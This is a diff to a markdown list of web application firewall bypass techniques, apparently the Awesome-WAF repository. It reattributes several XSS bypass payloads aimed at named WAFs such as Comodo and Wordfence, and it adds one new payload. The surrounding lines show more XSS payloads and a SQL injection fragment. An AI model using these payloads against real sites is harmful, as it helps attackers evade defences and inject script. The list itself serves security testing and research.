@@ -2513,7 +2513,7 @@ GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&co
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
 <a/href=&#74;ava%0a%0d%09script&colon;alert()>click
 ```
@@ -2569,13 +2569,13 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ```
 <--`<img/src=` onerror=confirm``> --!>
 ```
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
 <a"/onclick=(confirm)()>click
 ```
 
 ### Comodo 
-- XSS Bypass by [@s0md3v](https://twiiter.com/s0md3v)
+- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
 <d3v/onauxclick=(((confirm)))``>click
 ```
@@ -2769,7 +2769,7 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v)
+- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
  <d3v/onauxclick=[2].some(confirm)>click 
 ```
@@ -2819,7 +2819,11 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 
 ### Wordfence
-- XSS Bypass by [@s0md3v](https://twitter.com/s0md3v) (>= v7.1)
+- XSS Bypass by [@brutelogic](https://twitter.com/brutelogic)
+```
+<a href=javas&#99;ript:alert(1)>
+```
+- XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
 <a/href=javascript&colon;alert()>click
 ```
@@ -2886,7 +2890,7 @@ python identYwaf.py --delay=2 --proxy=<proxy> <target>
 
 ### Testing:
 - [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
-- [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A free WAF testing tool by [Imperva](https://imperva.com).
+- [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).
 
 ### Evasion:  
 __1. Evading WAFs with [SQLMap Tamper Scripts](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)__:
